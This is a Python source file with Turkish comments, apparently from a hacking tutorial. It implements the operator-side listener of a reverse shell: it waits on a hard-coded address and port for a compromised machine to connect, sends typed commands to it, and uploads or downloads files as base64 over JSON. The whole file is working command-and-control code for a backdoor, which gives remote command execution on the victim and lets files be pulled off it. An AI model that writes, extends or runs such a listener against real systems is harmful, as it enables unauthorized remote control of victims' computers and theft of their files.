import socket
import json
import base64
class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        my_listener.bind((ip,port))
        my_listener.listen(0)
        print("Listening.... :)")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection OK from " + str(my_address))


    def json_send(self, data):
        if isinstance(data[-1], bytes):  # Eğer son öğe bayt dizisi ise
        # Son öğeyi bayt dizisi olarak göndermek için JSON'a dönüştürme
            data[-1] = base64.b64encode(data[-1]).decode()
        json_data = json.dumps(data)
        self.my_connection.send(json_data.encode())
    
    def json_receive(self):
        json_data = b""
        while True:
            try:
                received_data = self.my_connection.recv(1024)  # Veriyi al
                json_data += received_data
                decoded_data = json_data.decode("utf-8")  # Aldığın veriyi dizeye dönüştür
                return json.loads(decoded_data)  # JSON verisini dizeye dönüştürerek yükle
            except ValueError:
                continue

    def command_execution(self,command_input):
        self.json_send(command_input)
        #çıkış işlemi
        if command_input[0] == "quit":
            self.my_connection.close()
            exit() 
        
        return self.json_receive()
    
    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK :)"

    def get_file_content(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())
        
    def start_listener(self):
        while True:    
            command_input = input("Enter command: ")
            # cd .. aradaki boşluğu anlamlandırmak için 
            command_input = command_input.split(" ")
            if command_input[0] == "upload":
                my_file_content = self.get_file_content(command_input[1])
                command_input.append(my_file_content)

            command_output = self.command_execution(command_input)
            
            if command_input[0] == "download":
                command_output = self.save_file(command_input[1],command_output)

            print(command_output)


my_socket_listener = SocketListener("192.168.1.115",8080)
my_socket_listener.start_listener()

